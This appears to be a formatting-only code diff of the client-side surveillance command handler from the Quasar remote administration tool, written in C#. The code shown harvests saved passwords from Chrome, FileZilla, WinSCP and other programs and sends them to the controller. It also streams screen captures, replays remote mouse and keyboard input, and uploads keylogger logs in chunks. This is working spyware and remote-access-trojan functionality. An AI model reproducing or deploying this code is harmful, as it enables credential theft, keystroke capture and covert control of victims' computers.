@@ -16,13 +16,10 @@ using Quasar.Common.Models;
 using Quasar.Common.Video;
 using Quasar.Common.Video.Codecs;
 
-namespace Quasar.Client.Commands
-{
+namespace Quasar.Client.Commands {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE SURVEILLANCE COMMANDS. */
-    public static partial class CommandHandler
-    {
-        public static void HandleGetPasswords(GetPasswords packet, Networking.Client client)
-        {
+    public static partial class CommandHandler {
+        public static void HandleGetPasswords(GetPasswords packet, Networking.Client client) {
             List<RecoveredAccount> recovered = new List<RecoveredAccount>();
 
             recovered.AddRange(Chrome.GetSavedPasswords());
@@ -33,21 +30,19 @@ namespace Quasar.Client.Commands
             recovered.AddRange(FileZilla.GetSavedPasswords());
             recovered.AddRange(WinSCP.GetSavedPasswords());
 
-            client.Send(new GetPasswordsResponse {RecoveredAccounts = recovered});
+            client.Send(new GetPasswordsResponse { RecoveredAccounts = recovered });
         }
 
-        public static void HandleGetDesktop(GetDesktop command, Networking.Client client)
-        {
+        public static void HandleGetDesktop(GetDesktop command, Networking.Client client) {
             // TODO: Capture mouse in frames: https://stackoverflow.com/questions/6750056/how-to-capture-the-screen-and-mouse-pointer-using-windows-apis
             var monitorBounds = ScreenHelper.GetBounds((command.DisplayIndex));
-            var resolution = new Resolution {Height = monitorBounds.Height, Width = monitorBounds.Width};
+            var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };
 
             if (StreamCodec == null)
                 StreamCodec = new UnsafeStreamCodec(command.Quality, command.DisplayIndex, resolution);
 
             if (command.CreateNew || StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.DisplayIndex
-                || StreamCodec.Resolution != resolution)
-            {
+                || StreamCodec.Resolution != resolution) {
                 if (StreamCodec != null)
                     StreamCodec.Dispose();
 
@@ -56,34 +51,27 @@ namespace Quasar.Client.Commands
 
             BitmapData desktopData = null;
             Bitmap desktop = null;
-            try
-            {
+            try {
                 desktop = ScreenHelper.CaptureScreen(command.DisplayIndex);
                 desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                     ImageLockMode.ReadWrite, desktop.PixelFormat);
 
-                using (MemoryStream stream = new MemoryStream())
-                {
+                using (MemoryStream stream = new MemoryStream()) {
                     if (StreamCodec == null) throw new Exception("StreamCodec can not be null.");
                     StreamCodec.CodeImage(desktopData.Scan0,
                         new Rectangle(0, 0, desktop.Width, desktop.Height),
                         new Size(desktop.Width, desktop.Height),
                         desktop.PixelFormat, stream);
-                    client.Send(new GetDesktopResponse
-                    {
+                    client.Send(new GetDesktopResponse {
                         Image = stream.ToArray(),
                         Quality = StreamCodec.ImageQuality,
                         Monitor = StreamCodec.Monitor,
                         Resolution = StreamCodec.Resolution
                     });
                 }
-            }
-            catch (Exception)
-            {
-                if (StreamCodec != null)
-                {
-                    client.Send(new GetDesktopResponse
-                    {
+            } catch (Exception) {
+                if (StreamCodec != null) {
+                    client.Send(new GetDesktopResponse {
                         Image = null,
                         Quality = StreamCodec.ImageQuality,
                         Monitor = StreamCodec.Monitor,
@@ -92,19 +80,12 @@ namespace Quasar.Client.Commands
                 }
 
                 StreamCodec = null;
-            }
-            finally
-            {
-                if (desktop != null)
-                {
-                    if (desktopData != null)
-                    {
-                        try
-                        {
+            } finally {
+                if (desktop != null) {
+                    if (desktopData != null) {
+                        try {
                             desktop.UnlockBits(desktopData);
-                        }
-                        catch
-                        {
+                        } catch {
                         }
                     }
                     desktop.Dispose();
@@ -112,18 +93,15 @@ namespace Quasar.Client.Commands
             }
         }
 
-        public static void HandleDoMouseEvent(DoMouseEvent command, Networking.Client client)
-        {
-            try
-            {
+        public static void HandleDoMouseEvent(DoMouseEvent command, Networking.Client client) {
+            try {
                 Screen[] allScreens = Screen.AllScreens;
                 int offsetX = allScreens[command.MonitorIndex].Bounds.X;
                 int offsetY = allScreens[command.MonitorIndex].Bounds.Y;
                 Point p = new Point(command.X + offsetX, command.Y + offsetY);
 
                 // Disable screensaver if active before input
-                switch (command.Action)
-                {
+                switch (command.Action) {
                     case MouseAction.LeftDown:
                     case MouseAction.LeftUp:
                     case MouseAction.RightDown:
@@ -134,8 +112,7 @@ namespace Quasar.Client.Commands
                         break;
                 }
 
-                switch (command.Action)
-                {
+                switch (command.Action) {
                     case MouseAction.LeftDown:
                     case MouseAction.LeftUp:
                         NativeMethodsHelper.DoMouseLeftClick(p, command.IsMouseDown);
@@ -154,40 +131,30 @@ namespace Quasar.Client.Commands
                         NativeMethodsHelper.DoMouseScroll(p, false);
                         break;
                 }
-            }
-            catch
-            {
+            } catch {
             }
         }
 
-        public static void HandleDoKeyboardEvent(DoKeyboardEvent command, Networking.Client client)
-        {
+        public static void HandleDoKeyboardEvent(DoKeyboardEvent command, Networking.Client client) {
             if (NativeMethodsHelper.IsScreensaverActive())
                 NativeMethodsHelper.DisableScreensaver();
 
             NativeMethodsHelper.DoKeyPress(command.Key, command.KeyDown);
         }
 
-        public static void HandleGetMonitors(GetMonitors command, Networking.Client client)
-        {
-            if (Screen.AllScreens.Length > 0)
-            {
-                client.Send(new GetMonitorsResponse {Number = Screen.AllScreens.Length});
+        public static void HandleGetMonitors(GetMonitors command, Networking.Client client) {
+            if (Screen.AllScreens.Length > 0) {
+                client.Send(new GetMonitorsResponse { Number = Screen.AllScreens.Length });
             }
         }
 
-        public static void HandleGetKeyloggerLogs(GetKeyloggerLogs command, Networking.Client client)
-        {
-            new Thread(() =>
-            {
-                try
-                {
+        public static void HandleGetKeyloggerLogs(GetKeyloggerLogs command, Networking.Client client) {
+            new Thread(() => {
+                try {
                     int index = 1;
 
-                    if (!Directory.Exists(Keylogger.LogDirectory))
-                    {
-                        client.Send(new GetKeyloggerLogsResponse
-                        {
+                    if (!Directory.Exists(Keylogger.LogDirectory)) {
+                        client.Send(new GetKeyloggerLogsResponse {
                             Filename = "",
                             Block = new byte[0],
                             MaxBlocks = -1,
@@ -201,10 +168,8 @@ namespace Quasar.Client.Commands
 
                     FileInfo[] iFiles = new DirectoryInfo(Keylogger.LogDirectory).GetFiles();
 
-                    if (iFiles.Length == 0)
-                    {
-                        client.Send(new GetKeyloggerLogsResponse
-                        {
+                    if (iFiles.Length == 0) {
+                        client.Send(new GetKeyloggerLogsResponse {
                             Filename = "",
                             Block = new byte[0],
                             MaxBlocks = -1,
@@ -216,14 +181,11 @@ namespace Quasar.Client.Commands
                         return;
                     }
 
-                    foreach (FileInfo file in iFiles)
-                    {
+                    foreach (FileInfo file in iFiles) {
                         FileSplit srcFile = new FileSplit(file.FullName);
 
-                        if (srcFile.MaxBlocks < 0)
-                        {
-                            client.Send(new GetKeyloggerLogsResponse
-                            {
+                        if (srcFile.MaxBlocks < 0) {
+                            client.Send(new GetKeyloggerLogsResponse {
                                 Filename = "",
                                 Block = new byte[0],
                                 MaxBlocks = -1,
@@ -234,13 +196,10 @@ namespace Quasar.Client.Commands
                             });
                         }
 
-                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
-                        {
+                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++) {
                             byte[] block;
-                            if (srcFile.ReadBlock(currentBlock, out block))
-                            {
-                                client.Send(new GetKeyloggerLogsResponse
-                                {
+                            if (srcFile.ReadBlock(currentBlock, out block)) {
+                                client.Send(new GetKeyloggerLogsResponse {
                                     Filename = Path.GetFileName(file.Name),
                                     Block = block,
                                     MaxBlocks = srcFile.MaxBlocks,
@@ -250,11 +209,8 @@ namespace Quasar.Client.Commands
                                     FileCount = iFiles.Length
                                 });
                                 //Thread.Sleep(200);
-                            }
-                            else
-                            {
-                                client.Send(new GetKeyloggerLogsResponse
-                                {
+                            } else {
+                                client.Send(new GetKeyloggerLogsResponse {
                                     Filename = "",
                                     Block = new byte[0],
                                     MaxBlocks = -1,
@@ -268,11 +224,8 @@ namespace Quasar.Client.Commands
 
                         index++;
                     }
-                }
-                catch (Exception ex)
-                {
-                    client.Send(new GetKeyloggerLogsResponse
-                    {
+                } catch (Exception ex) {
+                    client.Send(new GetKeyloggerLogsResponse {
                         Filename = "",
                         Block = new byte[0],
                         MaxBlocks = -1,
